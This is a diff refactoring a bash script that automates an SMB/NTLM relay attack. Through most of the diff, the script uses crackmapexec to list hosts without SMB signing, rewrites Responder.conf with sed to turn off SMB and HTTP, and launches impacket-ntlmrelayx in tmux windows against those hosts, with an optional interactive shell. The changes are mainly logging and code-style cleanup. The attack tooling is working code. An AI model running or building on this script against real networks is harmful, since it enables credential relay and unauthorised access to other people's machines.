@@ -10,6 +10,7 @@ IFS=$'\n\t'
 
 responder_config_file="${RESPONDER_CONF:-/etc/responder/Responder.conf}"
 session_name="smb_relay_attack"
+TARGET_FILE=""
 TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
 enable_interactive=false
 AUTO_MODE=false
@@ -17,7 +18,6 @@ SESSION_CREATED=false
 
 RUN_ID=$(date +%s)
 LOG_DIR="logs_${RUN_ID}"
-mkdir -p "$LOG_DIR"
 
 ATTACK_LOG="${LOG_DIR}/attack.log"
 RESPONDER_LOG="${LOG_DIR}/responder.log"
@@ -31,13 +31,15 @@ BLUE='\033[0;34m'
 CYAN='\033[0;36m'
 RESET='\033[0m'
 
+mkdir -p "$LOG_DIR"
+
 # Network interface (dynamically detected by default)
 network_interface="$(ip -o -4 route show to default | awk '{print $5}' | head -n1)"
 
 cleanup() {
     local exit_code=$?
 
-    if [ "$SESSION_CREATED" = true ] && [ $exit_code -ne 0 ]; then
+    if [[ "$SESSION_CREATED" == true ]] && [ $exit_code -ne 0 ]; then
         log INFO "${YELLOW}[*] Cleaning up tmux session...${RESET}"
         tmux has-session -t "$session_name" 2>/dev/null && \
         tmux kill-session -t "$session_name"
@@ -81,7 +83,10 @@ log() {
 
 # Check if a tool is installed
 check_tool() {
-    command -v "$1" &>/dev/null || return 1
+    if ! command -v "$1" &>/dev/null; then
+        log ERROR "${RED}[!] Missing dependency: $1${RESET}"
+        return 1
+    fi
 }
 
 # Validate network interface
@@ -96,12 +101,12 @@ validate_network_interface() {
 run_crackmapexec() {
     log INFO "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}"
 
-    crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}" || {
+    if ! crackmapexec smb "${TARGET_FILE}" --gen-relay-list "${TARGET_SMB_FILE}" 2>&1 | tee -a "$ATTACK_LOG"; then
         log ERROR "${RED}[!] crackmapexec failed.${RESET}"
         return 1
-    }
+    fi
 
-    if [ ! -s "${TARGET_SMB_FILE}" ]; then
+    if [[ ! -s "${TARGET_SMB_FILE}" ]]; then
         log ERROR "${RED}[!] No vulnerable targets found.${RESET}"
         return 1
     fi
@@ -109,26 +114,27 @@ run_crackmapexec() {
     count=$(wc -l < "${TARGET_SMB_FILE}")
     log INFO "${YELLOW}[+] Found $count vulnerable target(s).${RESET}"
 
-    while read -r ip; do
+    while IFS= read -r ip; do
         echo -e "${YELLOW}[!] $ip${RESET}"
     done < "${TARGET_SMB_FILE}"
 }
 
 # Edit Responder.conf file
 edit_responder_conf() {
-    if [ ! -f "${responder_config_file}" ]; then
+    [[ -f "$responder_config_file" ]] || {
         log ERROR "${RED}[!] Responder.conf file not found.${RESET}"
         return 1
-    fi
+    }
 
-    if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
+    if grep -qE '^SMB = Off$' "$responder_config_file" &&
+       grep -qE '^HTTP = Off$' "$responder_config_file"; then
         log INFO "${BLUE}[*] Responder.conf already configured.${RESET}"
         return 0
     fi
 
-    log INFO "${YELLOW}[*] Updating Responder.conf to turn off HTTP and SMB...${RESET}"
-    sed -i 's/^SMB = .*/SMB = Off/' "${responder_config_file}"
-    sed -i 's/^HTTP = .*/HTTP = Off/' "${responder_config_file}"
+    log INFO "${YELLOW}[*] Updating Responder.conf. Turning off HTTP and SMB...${RESET}"
+    sed -i 's/^SMB = .*/SMB = Off/' "$responder_config_file"
+    sed -i 's/^HTTP = .*/HTTP = Off/' "$responder_config_file"
 
     log SUCCESS "${GREEN}[+] Responder.conf updated successfully.${RESET}"
 }
@@ -139,13 +145,12 @@ start_tmux_window() {
     local window_name=$2
     local command=$3
 
-    # Only responsibility: manage windows + send commands
-    if ! tmux list-windows -t "$session_name" 2>/dev/null | grep -qw "$window_name"; then
-        tmux new-window -t "$session_name" -n "$window_name"
-    fi
+    tmux kill-window -t "$session_name:$window_name" 2>/dev/null || true
+    tmux new-window -t "$session_name" -n "$window_name"
 
-    tmux send-keys -t "$session_name:$window_name" "bash -c \"$command\""
-    tmux send-keys -t "$session_name:$window_name" C-m
+    log INFO "[tmux:$window_name] $command"
+
+    tmux send-keys -t "$session_name:$window_name" "$command" C-m
 }
 
 # Function to execute SMB relay attack in tmux
@@ -169,11 +174,13 @@ run_smb_relay_attack() {
     # Start ntlmrelayx in another tmux window
     log INFO "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
 
-    relay_command=$(printf 'impacket-ntlmrelayx -smb2support -tf "%s" 2>&1 | tee -a "%s"' "$TARGET_SMB_FILE" "$RELAY_LOG")
-    if [ "$enable_interactive" = true ]; then
-        log INFO "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
+    relay_command="impacket-ntlmrelayx -smb2support -tf \"$TARGET_SMB_FILE\""
+    
+    if [[ "$enable_interactive" == true ]]; then
         relay_command+=" --interactive"
     fi
+    
+    relay_command+=" 2>&1 | tee -a \"$RELAY_LOG\""
     
     start_tmux_window "$session_name" "ntlmrelayx" "$relay_command" || {
         log ERROR "${RED}Failed to start ntlmrelayx.${RESET}"
@@ -264,10 +271,7 @@ validate_network_interface
 REQUIRED_TOOLS=("tmux" "responder" "impacket-ntlmrelayx" "crackmapexec")
 
 for tool in "${REQUIRED_TOOLS[@]}"; do
-    check_tool "$tool" || {
-        log ERROR "${RED}[!] Missing dependency: $tool${RESET}"
-        exit 1
-    }
+    check_tool "$tool" || exit 1
 done
 
 if ! run_crackmapexec; then
